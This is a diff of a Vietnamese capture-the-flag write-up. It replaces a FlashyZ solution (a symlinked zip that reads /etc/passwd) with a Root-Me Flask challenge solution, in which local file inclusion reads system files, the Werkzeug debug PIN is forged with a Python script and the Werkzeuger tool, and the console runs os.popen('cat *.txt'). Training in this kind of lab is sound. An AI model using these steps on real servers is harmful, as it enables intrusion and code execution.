@@ -1,13 +1,16 @@
-# Symlink Attack + Werkzeug / Flask Debug
+# Flask - Development Server
 
-**Tên challenge:**  FlashyZ
+**Tên challenge:**  You need to debug this !
 
-**Link challenge:** `FlashyZ.zip`
+**Link challenge:** [Here](https://www.root-me.org/en/Challenges/Web-Server/Flask-Development-server)
 
-**Tác giả challenge:** Dat2Phit
+**Tác giả challenge:** Sanlokii
 
 **Mục tiêu challenge:**
-Read `/flag.txt`
+Flask-me’s web developer tells you that the website is ready for deployment.
+Check that the site is secure before going into production.
+
+The flag is located in the application’s web directory.
 
 **Tác giả Writeup:** Shino
 
@@ -15,104 +18,26 @@ Read `/flag.txt`
 
 # Bài giải
 
-**B1:** Đầu tiên, ta sẽ thấy trang Web có chức năng Upload ảnh như sau:
+**B1:** Đầu tiên, ta sẽ thấy trang Web đơn giản như sau:
 
 ![alt text](./images/image.png)
 
-Chức năng Upload này chỉ được phép Up file `.zip` và khi đọc qua Source Code của Challenge thì ta chẳng có cách nào khác để Bypass Upload 1 file có đuôi khác `.zip` hay là đổi tên file để khai thác `Path Traversal` vì đoạn code sau đây sẽ đổi tên file thành ngẫu nhiên khi trước đưa vào thực thi command `unzip ...`.
-
-```
-@app.route("/upload", methods=["POST"])
-def upload():
-    if "file" not in request.files:
-        flash("No file uploaded", "danger")
-        return render_template("index.html")
-
-    file = request.files["file"]
-    if file.filename.split(".")[-1].lower() != "zip":
-        flash("Invalid extension", "danger")
-        return render_template("index.html")
-
-    the_zip_file = zipfile.ZipFile(file)
-    if the_zip_file.testzip() is not None:
-        flash("Invalid file", "danger")
-        return render_template("index.html")
-    
-    file.stream.seek(0)
-    upload_uuid = str(uuid.uuid4())
-    filename = f"{UPLOAD_DIR}/zips/{upload_uuid}.zip"
-    file.save(filename)
-    subprocess.call(["unzip", filename, "-d", f"{UPLOAD_DIR}/out/{upload_uuid}"])
-    flash(
-        f'Your file is at <a href="/list/{upload_uuid}">{upload_uuid}</a>!', "success"
-    )
-    return redirect("/")
-```
-
-Và cho dù ta Upload 1 file shell python thì ta cũng không thể thực thi nó vì đoạn code sau chỉ đọc nội dung của file chứ không thực thi nó:
-```
-@app.route("/view/<string:path>/<string:filename>")
-def view(path, filename):
-    try:
-        file_path = os.path.join(f"{UPLOAD_DIR}/out", os.path.basename(path))
-        content = open(f"{file_path}/{os.path.basename(filename)}").read()
-        return content
-    except:
-        abort(404)
-```
-=> Các cách khai thác phổ thông đều đã bị chặn đứng.
-
-Nhưng có 1 file đặc biệt khi kết hợp với file `.zip` sẽ có thể tạo ra 1 lỗ hổng để ta khai thác và đó chính là `symlink`.
-
-<u>**Thông tin thêm:**</u> Bạn có thể tìm hiểu thêm `symlink` trên mạng.
-
-**B2:** Ta bắt đầu tạo 1 file `symlink` trỏ tới file `/etc/passwd` và sau đó nén thành file `.zip` rồi Upload lên Server để xem liệu file `symlink` này có đọc được file `/etc/passwd` của Website không.
-
-Đầu tiên, ta sẽ tạo file `symlink` trỏ tới file `/etc/passwd` qua lệnh:
-```
-$> ln -s /etc/passwd test_symlink
-
-$> ls -la
-total 12
-drwxr-xr-x 2 root root 4096 Nov 18 11:14 .
-drwxr-xr-x 9 root root 4096 Nov 18 08:02 ..
-lrwxrwxrwx 1 root root   11 Nov 18 11:14 test_symlink -> /etc/passwd
-
-```
-Như vậy là ta đã thành công tạo 1 file `symlink` trỏ tới `/etc/passwd`, tiếp đến ta sẽ nén file `test_symlink` này thành file `.zip`:
-```
-$> zip -y test.zip test_symlink
-  adding: test_symlink (stored 0%)
-
-$> ls -la
-total 14
-drwxr-xr-x 2 root root 4096 Nov 18 11:15 .
-drwxr-xr-x 9 root root 4096 Nov 18 08:02 ..
-lrwxrwxrwx 1 root root   11 Nov 18 11:14 test_symlink -> /etc/passwd
--rw-r--r-- 1 root root  185 Nov 18 11:15 test.zip
-```
-
-Cuối cùng, ta sẽ Upload file `.zip` này lên Website.
-
-Ta mở file vừa được Server giải nén ra và kết quả:
+Sau khi CLick thử từng chỉ mục trên Website thì chỉ có duy nhất `SERVICES` là sử dụng được và nó show ra 1 chức năng khác của ứng dụng:
 
 ![alt text](./images/image-1.png)
 
-=> Ta đã thành công khai thác `Symlink Attack`
+**B2:** Ta thử nhập `/etc/passwd` để xem liệu chức năng này có bị LFI không:
 
-**B3:** Ta tạo 1 file `symlink` khác trỏ tới `/flag.txt` và làm tương tự cách trên để xem có đọc được `Flag` không.
+![alt text](./images/image-2.png)
 
-=> Kết quả là, ta không thể đọc được `Flag`
+=> Chức năng này của Website bị LFI.
 
-Nguyên nhân vì sao thì tí nữa bạn sẽ biết.
+Tuy nhiên, ta không thể biết được tên chính xác của file chứa `Flag` nên không thể nào tận dụng lỗ hổng LFI để đọc `Flag`.
 
 Vậy giờ, chúng ta phải làm gì tiếp theo ?
-* **Trả lời:** Khi ta đọc lại Source Code thì ta sẽ phát hiện tính năng `Debug Flask` của Website đang được bật
-```
-if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
-```
-Cụ thể thì tính năng này sẽ giúp Developer có thể thực thi code trên trang Web thông qua endpoint `/console` trong quá trình phát triển sản phẩm. Ngoài thực tế thì tính năng `Debug` này sẽ không được bật vì tính rủi ro, nhưng nhiều lúc các `Developer` sẽ bất cẩn và bật tính năng này để thao tác với trang Web nhưng lại quên tắt.
+
+* **Trả lời:** Khi ta đọc lại tên Challenge là `Flask - Development Server` thì ta sẽ nghĩ đến tính năng `Debug Flask` của Python.
+* Cụ thể thì tính năng này sẽ giúp Developer có thể thực thi code trên trang Web thông qua endpoint `/console` trong quá trình phát triển sản phẩm. Ngoài thực tế thì tính năng `Debug` này sẽ không được bật vì tính rủi ro, nhưng nhiều lúc các `Developer` sẽ bất cẩn và bật tính năng này để thao tác với trang Web nhưng lại quên tắt.
 
 **B4:** Ta thử truy cập endpoint `/console` để xem có thể thực thi code trên Web không.
 
@@ -135,16 +60,9 @@ Thông thường thì file `__init__.py` nằm ở đường dẫn sau đây:
 ```
 /usr/local/lib/python3.5/dist-packages/werkzeug/__init__.py
 ```
-Nhưng đây là bản `python3.5`, còn Server đang chạy ở bản `python3.10` ( Đọc Source Code là biết ) cho nên đường dẫn sẽ khác 1 chút:
-```
-/usr/local/lib/python3.10/dist-packages/werkzeug/__init__.py
+Nhưng đây là bản `python3.5`, còn Server đang chạy ở bản `python3.11` ( dùng [Wappalyzer Extension Google Chrome](https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=vi) để biết ) cho nên đường dẫn sẽ khác 1 chút, ngoài ra còn có thể phụ thuộc vào Developer cài Python trên Server ở thư mục nào nữa.
 
-Hoặc
-
-/usr/local/lib/python3.10/site-packages/werkzeug/__init__.py
-```
-
-Từ đây, ta sẽ tạo 2 file `symlink` trỏ tới 2 đường dẫn trên và nén cả 2 thành 1 file `.zip` sau đó đẩy lên Server và ta sẽ mở cả 2 file và 1 trong 2 đường dẫn sẽ trả về kết quả file `__init__.py`
+Do đó, ta có thể bỏ qua bước này nếu không thể tìm được đường dẫn chính xác của `werkzeug` trên ứng dụng và ta vẫn có thể xem file `__init__.py` trên Github như 1 cách thay thế.
 
 **B4:** Ta cần đọc nội dung sau đây trong file `__init__.py`
 ```
@@ -275,7 +193,7 @@ IP address       HW type     Flags       HW address            Mask     Device
 
 * => `DEVICE ID` của Website là `eth0`
 
-    * Tiếp theo, bạn sẽ lấy địa chỉ MAC thông qua đọc file sau đây: `/sys/class/net/<device id>/address` thay `<device id>` thành `eth0`
+    * Tiếp theo, bạn sẽ lấy địa chỉ MAC thông qua đọc file sau đây: `/sys/class/net/<device id>/address` thay `<device id>` thành `eth0` ta sẽ được: `/sys/class/net/eth0/address`.
     * Sau khi lấy được mã MAC thì bạn phải chuyển nó sang nhị phân bằng cách sau:
 ```
 # Example MAC address: 02:42:ac:16:00:02
@@ -325,15 +243,15 @@ Thế là ta đã xong phần lấy giá trị của các biến rồi, bây gi�
 import hashlib
 from itertools import chain
 probably_public_bits = [
-        'user',# username
+        'web-app',# username
         'flask.app',# modname
         "Flask",# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-        '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+        '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
 ]
 
 private_bits = [
-        '2485378220034',# str(uuid.getnode()),  /sys/class/net/ens33/address
-        '579cb1c1-d66e-4bff-8f9d-630242ce704de58d9ff458b35c246e31a7191e1b98df30b4579dfea0639cfdfae3514465a36d'# get_machine_id(), /etc/machine-id
+        '2485377826846',# str(uuid.getnode()),  /sys/class/net/ens33/address
+        '2d8fd891-f91a-48d5-9fcd-d1e533e4c832'# get_machine_id(), /etc/machine-id
 ]
 
 h = hashlib.sha1() # sometimes will be h = hashlib.md5()
@@ -366,24 +284,168 @@ print(rv)
 ```
 Bạn chỉ cần thay những giá trị bạn vừa tìm được vào code trên thôi.
 
-<u>**Lưu ý:**</u> Đôi lúc dòng `h = hashlib.sha1()` có thể là `h = hashlib.md5()`, đó là lý do tôi bảo bạn nên đọc file `__init__.py` của Server để dựa trên đó mà chỉnh code cho đúng, nếu không sẽ không ra đúng mã `PIN DEBUG` của Server.
+<u>**Lưu ý:**</u> Đôi lúc dòng `h = hashlib.sha1()` có thể là `h = hashlib.md5()`, đó là lý do tôi bảo bạn nên đọc file `__init__.py` của Server để dựa trên đó mà chỉnh code cho đúng, nếu không sẽ không ra đúng mã `PIN DEBUG` của Server. Tuy nhiên, bạn có thể Generate `PIN` ra theo 2 thuật toán trên nếu bạn không thể tìm được thư mục chính xác của file `__init__.py` trên ứng dụng và thử lần lượt xem cái nào được.
 
 Sau khi chỉnh xong, thì ta sẽ chạy file và có được mã `PIN`.
 
-**B5:** Ta nhập mã `PIN` vào `/console` và ta đã thành công vào được `Interactive Console`
+<u>**Thông tin thêm:**</u> Ngoài ra, có thể đôi lúc bạn thay thế hoặc tính toán các giá trị không chính xác thì cũng sẽ dẫn đến kết quả sai, cho nên tôi khuyến nghị bạn nên dùng [Tool](https://github.com/SidneyJob/Werkzeuger) để sinh ra mã `PIN` tự động mà không cần tính toán trong trường hợp ta không đọc được file `__init__.py` trên ứng dụng.
 
-![alt text](./images/image-2.png)
+<u>**Hướng dẫn sử dụng tool:**</u>
 
-Tiếp theo, ta sẽ thực thi Command bằng cách bước sau:
+* Giả sử ta thu thập được các thông tin sau:
+```
+Username: web-app
+Modname: flask.app
+Appname: Flask
+Path: /home/web-app/.local/lib/python3.11/site-packages/flask/app.py
+Mac: 02:42:ac:10:00:1e
+Machine-id: 2d8fd891-f91a-48d5-9fcd-d1e533e4c832
+Cgroup ( lấy cả dòng đầu tiên của cat /proc/self/cgroup ): 12:blkio:/user.slice
+```
+* Ta sẽ tiến hành dùng tool như sau:
+```
+$> python gen.py --username web-app --path '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' --modname flask.app --appname Flask --mac '02:42:ac:10:00:1e' --machine_id '2d8fd891-f91a-48d5-9fcd-d1e533e4c832' --cgroup '12:blkio:/user.slice'
 
-![alt text](./images/image-4.png)
 
-=> Đây chính là nguyên nhân ta không đọc được `Flag` vì chỉ có `root` mới đọc được file `flag.txt` thôi mà ta đang ở quyền `user` cho nên ta không thể đọc được `flag` và bây giờ thì vẫn ở quyền `user` nên không thể đọc được.
 
-Nhưng khi để ý đến file `readflag` thì ta thấy ta có quyền thực thi nó, cho nên ta sẽ thử thực thi nó bằng lệnh sau:
+                        ¶         ¶
+                         ¶         ¶
+                     ¶   ¶         ¶   ¶
+                     ¶  ¶¶         ¶¶  ¶
+                     ¶¶ ¶¶¶       ¶¶¶ ¶¶
+             ¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶
+            ¶¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶¶
+           ¶¶      ¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶      ¶¶
+           ¶¶     ¶¶¶    ¶¶¶¶  ¶¶¶¶¶    ¶¶¶     ¶¶¶
+       ¶  ¶¶¶    ¶¶¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶¶¶   ¶¶¶¶  ¶
+       ¶¶ ¶¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶¶ ¶¶
+       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
+       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
+      ¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶
+     ¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶
+    ¶¶¶¶   ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶   ¶¶¶¶
+   ¶¶¶¶    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶
+   ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶
+    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+      ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+     ¶¶¶¶¶           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           ¶¶¶¶¶
+     ¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶¶¶¶¶¶             ¶¶¶¶¶¶
+      ¶¶¶¶¶¶¶        ..     ¶¶¶¶¶¶¶¶¶     ..        ¶¶¶¶¶¶
+       ¶¶¶¶¶¶¶¶             ¶¶¶¶¶             ¶¶¶¶¶¶¶¶
+        ¶¶¶¶¶¶¶¶¶¶           ¶¶¶           ¶¶¶¶¶¶¶¶¶¶
+           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+              ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+                  ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶
+                   ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶
+                  ¶¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶
+                  ¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶
+                 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+                 ¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶
+                  ¶¶  ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶  ¶¶
+                      ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶
+
+
+
+__          __             _
+\ \        / /            | |
+ \ \  /\  / /   ___  _ __ | | __ ____  ___  _   _   __ _   ___  _ __
+  \ \/  \/ /   / _ \| '__|| |/ /|_  / / _ \| | | | / _` | / _ \| '__|
+   \  /\  /   |  __/| |   |   <  / / |  __/| |_| || (_| ||  __/| |
+    \/  \/     \___||_|   |_|\_\/___| \___| \__,_| \__, | \___||_|
+                                                    __/ |
+                                                   |___/
+
+
+                Author:  https://github.com/SidneyJob
+                Channel: https://t.me/SidneyJobChannel
+
+[+] Success!
+[*] PIN: 127-238-586
+[*] Cookie: __wzdb1e47176f310e73f3314=1733281046|a79d0a7235a4
+[*] Modname: flask.app
+[*] Appname: wsgi_app
+
+[+] Success!
+[*] PIN: 196-186-932
+[*] Cookie: __wzd7ccff39bc85b370db0c1=1733281046|09e1568891f7
+[*] Modname: flask.app
+[*] Appname: DebuggedApplication
+
+[+] Success!
+[*] PIN: 233-954-601
+[*] Cookie: __wzd0b1910ef36f1edb5d592=1733281046|d077eb066a34
+[*] Modname: flask.app
+[*] Appname: Flask
+
+[+] Success!
+[*] PIN: 233-954-601
+[*] Cookie: __wzd0b1910ef36f1edb5d592=1733281046|d077eb066a34
+[*] Modname: flask.app
+[*] Appname: Flask
+
+[+] Success!
+[*] PIN: 526-339-984
+[*] Cookie: __wzdc4637ea1361e5a6f5bc8=1733281046|46909e8eda23
+[*] Modname: werkzeug.debug
+[*] Appname: wsgi_app
+
+[+] Success!
+[*] PIN: 740-176-798
+[*] Cookie: __wzd9c033687e9f3c510a643=1733281046|d50320007301
+[*] Modname: werkzeug.debug
+[*] Appname: DebuggedApplication
+
+[+] Success!
+[*] PIN: 909-012-002
+[*] Cookie: __wzda1670f07ac1aeb194b06=1733281046|323a43d082d1
+[*] Modname: werkzeug.debug
+[*] Appname: Flask
+
+[+] Success!
+[*] PIN: 909-012-002
+[*] Cookie: __wzda1670f07ac1aeb194b06=1733281046|323a43d082d1
+[*] Modname: werkzeug.debug
+[*] Appname: Flask
+
+[+] Success!
+[*] PIN: 127-238-586
+[*] Cookie: __wzdb1e47176f310e73f3314=1733281046|a79d0a7235a4
+[*] Modname: flask.app
+[*] Appname: wsgi_app
+
+[+] Success!
+[*] PIN: 196-186-932
+[*] Cookie: __wzd7ccff39bc85b370db0c1=1733281046|09e1568891f7
+[*] Modname: flask.app
+[*] Appname: DebuggedApplication
+
+[+] Success!
+[*] PIN: 233-954-601
+[*] Cookie: __wzd0b1910ef36f1edb5d592=1733281046|d077eb066a34
+[*] Modname: flask.app
+[*] Appname: Flask
+
+[+] Success!
+[*] PIN: 233-954-601
+[*] Cookie: __wzd0b1910ef36f1edb5d592=1733281046|d077eb066a34
+[*] Modname: flask.app
+[*] Appname: Flask
+
+[+] 12 payloads are successfully generated!
+```
+
+**B5:** Ta nhập từng mã `PIN` trên vào `/console` và 1 trong những payload trên đã thành công vào được `Interactive Console`
 
 ![alt text](./images/image-3.png)
-
-=> Ta đã thành công đọc được `Flag` thông qua file `readflag`.
+Tiếp theo, ta sẽ thực thi Command đọc `Flag` bằng cách nhập lệnh sau:
+```
+[console ready]
+>>>  __import__('os').popen('cat *.txt').read()
+```
+![alt text](./images/image-4.png)
+=> Ta đã thành công đọc được `Flag`.
 
 <u>**Đọc thêm:**</u> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#code-for-get_machine_id
